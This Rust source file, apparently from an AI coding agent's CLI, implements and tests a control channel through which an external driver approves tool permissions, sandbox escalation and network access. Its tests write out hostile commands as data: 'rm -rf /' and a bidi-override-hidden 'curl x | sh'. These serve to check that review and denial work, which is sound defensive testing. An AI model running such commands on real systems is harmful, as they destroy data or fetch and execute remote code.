//! Opt-in control channel for `-p --input-format stream-json --output
//! stream-json --stream-json-control`.
//!
//! Without the flag nothing here is reachable: a `control_request` /
//! `control_response` line is an ordinary `input_error` and a headless `Ask`
//! is denied (or answered by an opted-in `PermissionRequest` hook). With it,
//! stdin is read concurrently with the running turn so a driver can
//!
//! * answer a tool permission ask: the runner emits
//!   `{"type":"control_request","request_id":"perm_N","request":{"subtype":
//!   "can_use_tool","tool_name":...,"input":...}}` and waits at most
//!   [`ASK_TIMEOUT`] for `{"type":"control_response","response":{"subtype":
//!   "success","request_id":"perm_N","response":{"behavior":"allow"|"deny"}}}`;
//!   the input is the full reviewed text (never clipped; over 1 MiB it is
//!   denied as too large to review); sandbox escalation (`sandbox_escalation`)
//!   and unlisted network hosts (`sandbox_network`) are asked the same way;
//!   a timeout, an `error` reply, a closed stdin or a turn cancelled while
//!   waiting all deny;
//! * `interrupt` the current turn (same cancellation as the first SIGINT);
//! * `set_permission_mode`, which can only narrow the active mode, exactly
//!   like a prompt `%%mode=` directive: it never raises privilege.
//!
//! Every driver request is acknowledged with a `control_response` line.

use std::collections::HashMap;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use tokio::sync::{Notify, oneshot};

use crate::permission::checker::PermCheck;
use crate::print::HeadlessOutputPolicy;

/// Largest permission-ask input sent to the driver. The driver sees the whole
/// input (an allow authorises all of it), so anything bigger is denied as too
/// large to review rather than clipped.
pub(crate) const MAX_ASK_INPUT_BYTES: usize = 1024 * 1024;

/// Tool name of a sandbox-escalation ask.
pub(crate) const SANDBOX_ESCALATION_TOOL: &str = "sandbox_escalation";
/// Tool name of a sandbox network host:port ask.
pub(crate) const SANDBOX_NETWORK_TOOL: &str = "sandbox_network";

/// Builds the `can_use_tool` request. The driver must see exactly what an
/// allow authorises: the input is never clipped, and deceptive format
/// characters appear as visible `<U+XXXX>` markers. Oversized input is refused
/// with the reason it was not offered.
fn ask_event(id: &str, tool: &str, input: &str) -> Result<serde_json::Value, String> {
    if input.len() > MAX_ASK_INPUT_BYTES {
        return Err(format!(
            "the request is {} bytes, too large to review (limit {MAX_ASK_INPUT_BYTES}); it was not run",
            input.len()
        ));
    }
    let reviewed = crate::ui::events::sanitize_for_review(input);
    let (tool_name, _) = crate::print::bounded_progress(tool, 256);
    Ok(serde_json::json!({
        "type": "control_request",
        "request_id": id,
        "request": {
            "subtype": "can_use_tool",
            "tool_name": tool_name,
            "input": reviewed.as_str(),
            "input_bytes": input.len(),
            "truncated": false,
        },
    }))
}

/// A driver's answer to a `can_use_tool` request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Reply {
    Allow,
    /// An allow the driver scoped to the whole run (`"scope":"run"`). Only a
    /// `sandbox_network` ask honours it; every other ask treats it as `Allow`.
    AllowForRun,
    Deny(String),
}

/// One recognised control line.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum ControlLine {
    Interrupt {
        request_id: Option<String>,
    },
    SetPermissionMode {
        request_id: Option<String>,
        mode: String,
    },
    Response {
        request_id: String,
        reply: Reply,
    },
    /// A `control_*` line that cannot be honoured; the text says why.
    Invalid {
        request_id: Option<String>,
        message: String,
    },
}

/// Classifies one stdin line. `None` means "not a control line" (a user
/// message, or garbage that the normal input path will report).
pub(crate) fn classify_line(line: &str) -> Option<ControlLine> {
    let value: serde_json::Value = serde_json::from_str(line).ok()?;
    let kind = value.get("type")?.as_str()?;
    let text = |value: &serde_json::Value, key: &str| {
        value
            .get(key)
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned)
    };
    match kind {
        "control_request" => {
            let request_id = text(&value, "request_id");
            let request = value.get("request");
            let subtype = request.and_then(|request| text(request, "subtype"));
            Some(match subtype.as_deref() {
                Some("interrupt") => ControlLine::Interrupt { request_id },
                Some("set_permission_mode") => match request.and_then(|r| text(r, "mode")) {
                    Some(mode) => ControlLine::SetPermissionMode { request_id, mode },
                    None => ControlLine::Invalid {
                        request_id,
                        message: "set_permission_mode needs a \"mode\"".into(),
                    },
                },
                other => ControlLine::Invalid {
                    request_id,
                    message: format!(
                        "unsupported control request {other:?} (interrupt, set_permission_mode)"
                    ),
                },
            })
        }
        "control_response" => {
            let response = value.get("response");
            let Some(request_id) = response.and_then(|r| text(r, "request_id")) else {
                return Some(ControlLine::Invalid {
                    request_id: None,
                    message: "control_response has no response.request_id".into(),
                });
            };
            let subtype = response.and_then(|r| text(r, "subtype"));
            let inner = response.and_then(|r| r.get("response"));
            let behavior = inner.and_then(|inner| text(inner, "behavior"));
            let reply = match (subtype.as_deref(), behavior.as_deref()) {
                (Some("success"), Some("allow")) => {
                    match inner.and_then(|inner| text(inner, "scope")).as_deref() {
                        Some("run" | "session") => Reply::AllowForRun,
                        _ => Reply::Allow,
                    }
                }
                (Some("success"), Some("deny")) => Reply::Deny(
                    inner
                        .and_then(|inner| text(inner, "message"))
                        .unwrap_or_else(|| "denied by the driver".into()),
                ),
                (Some("error"), _) => Reply::Deny(
                    response
                        .and_then(|r| text(r, "error"))
                        .unwrap_or_else(|| "the driver reported an error".into()),
                ),
                _ => {
                    return Some(ControlLine::Invalid {
                        request_id: Some(request_id),
                        message:
                            "control_response must be success with behavior allow|deny, or error"
                                .into(),
                    });
                }
            };
            Some(ControlLine::Response { request_id, reply })
        }
        _ => None,
    }
}

pub(crate) struct ControlState {
    pending: Mutex<HashMap<String, oneshot::Sender<Reply>>>,
    next_id: AtomicU64,
    interrupt: Notify,
    permission: Mutex<Option<PermCheck>>,
    output: HeadlessOutputPolicy,
    timeout: Duration,
}

/// Removes a still-pending ask when its waiter is dropped (cancelled turn).
struct PendingGuard<'a> {
    state: &'a ControlState,
    id: String,
}

impl Drop for PendingGuard<'_> {
    fn drop(&mut self) {
        self.state
            .pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .remove(&self.id);
    }
}

impl ControlState {
    pub(crate) fn new(
        output: HeadlessOutputPolicy,
        permission: Option<PermCheck>,
        timeout: Duration,
    ) -> Self {
        Self {
            pending: Mutex::new(HashMap::new()),
            next_id: AtomicU64::new(1),
            interrupt: Notify::new(),
            permission: Mutex::new(permission),
            output,
            timeout,
        }
    }

    /// Emits a `can_use_tool` request and waits for the driver. Anything other
    /// than an explicit allow within the timeout is a denial.
    pub(crate) async fn ask(&self, tool: &str, input: &str) -> Reply {
        match self.ask_raw(tool, input).await {
            // A run-scoped allow means something only for network hosts.
            Reply::AllowForRun => Reply::Allow,
            other => other,
        }
    }

    async fn ask_raw(&self, tool: &str, input: &str) -> Reply {
        let id = format!("perm_{}", self.next_id.fetch_add(1, Ordering::Relaxed));
        let (tx, rx) = oneshot::channel();
        self.pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .insert(id.clone(), tx);
        let _guard = PendingGuard {
            state: self,
            id: id.clone(),
        };
        let event = match ask_event(&id, tool, input) {
            Ok(event) => event,
            Err(reason) => return Reply::Deny(reason),
        };
        if self.output.emit_event(event).await.is_err() {
            return Reply::Deny("the control channel is closed".into());
        }
        // A zero timeout waits until the driver answers, stdin closes or the
        // turn is interrupted.
        if self.timeout.is_zero() {
            return match rx.await {
                Ok(reply) => reply,
                Err(_) => Reply::Deny("the control channel closed".into()),
            };
        }
        match tokio::time::timeout(self.timeout, rx).await {
            Ok(Ok(reply)) => reply,
            Ok(Err(_)) => Reply::Deny("the control channel closed".into()),
            Err(_) => Reply::Deny(format!(
                "no control_response within {}s",
                self.timeout.as_secs()
            )),
        }
    }

    /// Asks the driver to approve running a command outside the sandbox. The
    /// request carries the full command and justification; an allow is for
    /// this command only (no always-grant exists on this channel).
    pub(crate) async fn ask_escalation(&self, command: &str, justification: &str) -> Reply {
        self.ask(
            SANDBOX_ESCALATION_TOOL,
            &format!("run WITHOUT the sandbox\nreason: {justification}\n$ {command}"),
        )
        .await
    }

    /// Request ids of the asks still waiting for the driver.
    #[cfg(test)]
    pub(crate) fn pending_ids(&self) -> Vec<String> {
        self.pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .keys()
            .cloned()
            .collect()
    }

    /// Asks the driver to let the sandbox reach one `host:port`.
    pub(crate) async fn ask_network(&self, host_port: &str) -> Reply {
        self.ask_raw(SANDBOX_NETWORK_TOOL, host_port).await
    }

    /// Applies one classified line and returns the acknowledgement event to
    /// emit (if any).
    pub(crate) fn handle(&self, line: ControlLine) -> Option<serde_json::Value> {
        let ack = |request_id: Option<String>, result: Result<(), String>| {
            let mut response = match &result {
                Ok(()) => serde_json::json!({"subtype": "success"}),
                Err(error) => serde_json::json!({"subtype": "error", "error": error}),
            };
            if let Some(id) = request_id {
                response["request_id"] = serde_json::Value::String(id);
            }
            Some(serde_json::json!({"type": "control_response", "response": response}))
        };
        match line {
            ControlLine::Interrupt { request_id } => {
                self.interrupt.notify_waiters();
                ack(request_id, Ok(()))
            }
            ControlLine::SetPermissionMode { request_id, mode } => {
                let result = self.set_mode(&mode);
                ack(request_id, result)
            }
            ControlLine::Response { request_id, reply } => {
                let sender = self
                    .pending
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .remove(&request_id);
                match sender {
                    Some(sender) => {
                        let _ = sender.send(reply);
                        None
                    }
                    None => Some(serde_json::json!({
                        "type": "input_error",
                        "message": format!("no pending permission request {request_id:?}"),
                    })),
                }
            }
            ControlLine::Invalid {
                request_id,
                message,
            } => ack(request_id, Err(message)),
        }
    }

    fn set_mode(&self, requested: &str) -> Result<(), String> {
        let mode = crate::permission::SecurityMode::from_str(requested).ok_or_else(|| {
            format!(
                "unknown permission mode {requested:?} (accepted: {})",
                crate::permission::SecurityMode::NAMES.join(", ")
            )
        })?;
        if let Some(refusal) = crate::config::managed::mode_violation(mode) {
            return Err(refusal);
        }
        let permission = self.permission.lock().unwrap_or_else(|e| e.into_inner());
        let Some(permission) = permission.as_ref() else {
            return Err("this run has no permission checker".into());
        };
        let applied = permission
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .set_prompt_mode(mode);
        if applied {
            Ok(())
        } else {
            Err(format!(
                "{requested:?} would raise privilege above the active mode; the channel can only narrow it"
            ))
        }
    }

    /// Resolves when a driver interrupt arrives after this call.
    pub(crate) async fn interrupted(&self) {
        self.interrupt.notified().await;
    }
}

static STATE: OnceLock<ControlState> = OnceLock::new();

/// Turns the channel on for this process (`--stream-json-control`).
pub(crate) fn enable(
    output: HeadlessOutputPolicy,
    permission: Option<PermCheck>,
    ask_timeout: Duration,
) {
    let _ = STATE.set(ControlState::new(output, permission, ask_timeout));
}

pub(crate) fn state() -> Option<&'static ControlState> {
    STATE.get()
}

/// Pends forever unless the channel is enabled.
pub(crate) async fn interrupted() {
    match STATE.get() {
        Some(state) => state.interrupted().await,
        None => std::future::pending().await,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn state(timeout: Duration) -> ControlState {
        // Json format: events are not written, so tests stay silent.
        ControlState::new(HeadlessOutputPolicy::legacy(false, false), None, timeout)
    }

    fn response(id: &str, behavior: &str) -> String {
        format!(
            r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"{behavior}","message":"no thanks"}}}}}}"#
        )
    }

    #[test]
    fn only_control_lines_are_classified_and_malformed_ones_are_reported() {
        assert_eq!(classify_line(r#"{"type":"user","content":"hi"}"#), None);
        assert_eq!(classify_line("not json"), None);
        assert_eq!(
            classify_line(
                r#"{"type":"control_request","request_id":"r1","request":{"subtype":"interrupt"}}"#
            ),
            Some(ControlLine::Interrupt {
                request_id: Some("r1".into())
            })
        );
        assert_eq!(
            classify_line(&response("perm_1", "allow")),
            Some(ControlLine::Response {
                request_id: "perm_1".into(),
                reply: Reply::Allow
            })
        );
        assert_eq!(
            classify_line(&response("perm_1", "deny")),
            Some(ControlLine::Response {
                request_id: "perm_1".into(),
                reply: Reply::Deny("no thanks".into())
            })
        );
        for bad in [
            r#"{"type":"control_request","request":{"subtype":"launch_missiles"}}"#,
            r#"{"type":"control_request","request":{"subtype":"set_permission_mode"}}"#,
            r#"{"type":"control_response","response":{"subtype":"success","request_id":"x","response":{"behavior":"maybe"}}}"#,
            r#"{"type":"control_response","response":{}}"#,
        ] {
            assert!(
                matches!(classify_line(bad), Some(ControlLine::Invalid { .. })),
                "{bad}"
            );
        }
    }

    #[tokio::test]
    async fn an_ask_waits_for_the_matching_reply_and_only_an_explicit_allow_approves() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        for (behavior, expected) in [
            ("allow", Reply::Allow),
            ("deny", Reply::Deny("no thanks".into())),
        ] {
            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move { waiting.ask("write", "tmp/x").await });
            let id = loop {
                if let Some(id) = state.pending.lock().unwrap().keys().next().cloned() {
                    break id;
                }
                tokio::task::yield_now().await;
            };
            // A reply for a different request is rejected and does not resolve the ask.
            assert!(
                state
                    .handle(classify_line(&response("perm_999", "allow")).unwrap())
                    .is_some_and(|event| event["type"] == "input_error")
            );
            assert!(!task.is_finished());
            assert!(
                state
                    .handle(classify_line(&response(&id, behavior)).unwrap())
                    .is_none()
            );
            assert_eq!(task.await.unwrap(), expected);
            assert!(state.pending.lock().unwrap().is_empty());
        }
    }

    #[tokio::test(start_paused = true)]
    async fn an_unanswered_ask_is_denied_after_the_timeout_and_a_cancelled_one_is_forgotten() {
        let state = state(Duration::from_secs(60));
        assert!(matches!(
            state.ask("shell", "rm -rf /").await,
            Reply::Deny(reason) if reason.contains("no control_response")
        ));
        assert!(state.pending.lock().unwrap().is_empty());
        // Dropping the waiter (turn cancelled mid-ask) removes the pending entry.
        let cancelled = tokio::time::timeout(Duration::from_secs(1), state.ask("write", "x")).await;
        assert!(cancelled.is_err());
        assert!(state.pending.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn an_interrupt_wakes_only_a_waiting_turn_and_is_acknowledged() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let ack = state
            .handle(ControlLine::Interrupt {
                request_id: Some("i1".into()),
            })
            .unwrap();
        assert_eq!(ack["response"]["subtype"], "success");
        assert_eq!(ack["response"]["request_id"], "i1");
        // An interrupt with nothing running is not remembered for the next turn.
        let idle = tokio::time::timeout(Duration::from_millis(50), state.interrupted()).await;
        assert!(idle.is_err());
        let waiting = std::sync::Arc::clone(&state);
        let turn = tokio::spawn(async move { waiting.interrupted().await });
        tokio::time::sleep(Duration::from_millis(20)).await;
        state.handle(ControlLine::Interrupt { request_id: None });
        tokio::time::timeout(Duration::from_secs(2), turn)
            .await
            .expect("the waiting turn is interrupted")
            .unwrap();
    }

    #[test]
    fn permission_mode_changes_can_only_narrow() {
        use crate::permission::SecurityMode;
        let checker = crate::permission::checker::PermissionChecker::new(
            &crate::permission::PermissionConfigs::default(),
            SecurityMode::Guarded,
            std::env::current_dir().ok(),
            Some(SecurityMode::NAMES.iter().map(|n| n.to_string()).collect()),
        )
        .unwrap();
        let permission: PermCheck = std::sync::Arc::new(std::sync::Mutex::new(checker));
        let state = ControlState::new(
            HeadlessOutputPolicy::legacy(false, false),
            Some(permission.clone()),
            Duration::from_secs(1),
        );
        let set = |mode: &str| {
            state
                .handle(ControlLine::SetPermissionMode {
                    request_id: None,
                    mode: mode.into(),
                })
                .unwrap()
        };
        assert_eq!(set("readonly")["response"]["subtype"], "success");
        assert_eq!(permission.lock().unwrap().mode(), SecurityMode::ReadOnly);
        let refused = set("yolo");
        assert_eq!(refused["response"]["subtype"], "error");
        assert!(
            refused["response"]["error"]
                .as_str()
                .unwrap()
                .contains("narrow")
        );
        assert_eq!(permission.lock().unwrap().mode(), SecurityMode::ReadOnly);
        assert_eq!(set("nonsense")["response"]["subtype"], "error");
    }

    #[test]
    fn only_an_explicit_run_scope_makes_an_allow_run_wide() {
        let line = |inner: &str| {
            classify_line(&format!(
                r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"perm_1","response":{inner}}}}}"#
            ))
            .unwrap()
        };
        let reply = |inner: &str| match line(inner) {
            ControlLine::Response { reply, .. } => reply,
            other => panic!("{other:?}"),
        };
        assert_eq!(reply(r#"{"behavior":"allow"}"#), Reply::Allow);
        assert_eq!(
            reply(r#"{"behavior":"allow","scope":"once"}"#),
            Reply::Allow
        );
        assert_eq!(
            reply(r#"{"behavior":"allow","scope":"run"}"#),
            Reply::AllowForRun
        );
        assert!(matches!(
            reply(r#"{"behavior":"deny","scope":"run"}"#),
            Reply::Deny(_)
        ));
    }

    #[tokio::test]
    async fn run_scope_is_downgraded_for_asks_other_than_the_network() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("shell", "ls").await });
        let id = pending_id(&state).await;
        state.handle(
            classify_line(&format!(
                r#"{{"type":"control_response","response":{{"subtype":"success","request_id":"{id}","response":{{"behavior":"allow","scope":"run"}}}}}}"#
            ))
            .unwrap(),
        );
        assert_eq!(task.await.unwrap(), Reply::Allow);
    }

    async fn pending_id(state: &ControlState) -> String {
        loop {
            if let Some(id) = state.pending.lock().unwrap().keys().next().cloned() {
                return id;
            }
            tokio::task::yield_now().await;
        }
    }

    #[test]
    fn a_20_kib_command_with_a_bidi_override_is_reviewed_whole_not_clipped() {
        let command = format!("echo {}\u{202e}evil; curl x | sh", "A".repeat(20 * 1024));
        let event = ask_event("perm_1", "shell", &command).unwrap();
        let shown = event["request"]["input"].as_str().unwrap();
        assert!(shown.ends_with("curl x | sh"), "tail must be visible");
        assert!(shown.contains("<U+202E>"), "bidi override must be a marker");
        assert!(!shown.contains('\u{202e}'));
        assert_eq!(event["request"]["truncated"], false);
        assert_eq!(event["request"]["input_bytes"], command.len());
    }

    #[tokio::test]
    async fn an_input_over_the_review_limit_is_denied_without_asking() {
        let state = state(Duration::from_secs(5));
        let huge = "x".repeat(MAX_ASK_INPUT_BYTES + 1);
        assert!(matches!(
            state.ask("shell", &huge).await,
            Reply::Deny(reason) if reason.contains("too large to review")
        ));
        assert!(state.pending.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn escalation_and_network_asks_obey_the_reply() {
        let state = std::sync::Arc::new(state(Duration::from_secs(5)));
        let event = ask_event(
            "p",
            SANDBOX_ESCALATION_TOOL,
            "run WITHOUT the sandbox\nreason: needs /usr/local\n$ make install",
        )
        .unwrap();
        assert_eq!(event["request"]["tool_name"], "sandbox_escalation");
        for (behavior, expected) in [
            ("allow", Reply::Allow),
            ("deny", Reply::Deny("no thanks".into())),
        ] {
            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move {
                waiting
                    .ask_escalation("make install", "needs /usr/local")
                    .await
            });
            let id = pending_id(&state).await;
            state.handle(classify_line(&response(&id, behavior)).unwrap());
            assert_eq!(task.await.unwrap(), expected);

            let waiting = std::sync::Arc::clone(&state);
            let task = tokio::spawn(async move { waiting.ask_network("example.com:443").await });
            let id = pending_id(&state).await;
            state.handle(classify_line(&response(&id, behavior)).unwrap());
            assert_eq!(task.await.unwrap(), expected);
        }
    }

    #[tokio::test(start_paused = true)]
    async fn escalation_and_network_asks_time_out_as_denials() {
        let state = state(Duration::from_secs(7));
        assert!(matches!(
            state.ask_escalation("rm x", "why").await,
            Reply::Deny(reason) if reason.contains("within 7s")
        ));
        assert!(matches!(
            state.ask_network("a.test:80").await,
            Reply::Deny(reason) if reason.contains("within 7s")
        ));
    }

    #[tokio::test(start_paused = true)]
    async fn a_zero_timeout_waits_for_the_driver() {
        let state = std::sync::Arc::new(state(Duration::ZERO));
        let waiting = std::sync::Arc::clone(&state);
        let task = tokio::spawn(async move { waiting.ask("write", "x").await });
        tokio::time::sleep(Duration::from_secs(86_400)).await;
        assert!(!task.is_finished(), "0 means no deadline");
        let id = pending_id(&state).await;
        state.handle(classify_line(&response(&id, "allow")).unwrap());
        assert_eq!(task.await.unwrap(), Reply::Allow);
    }
}
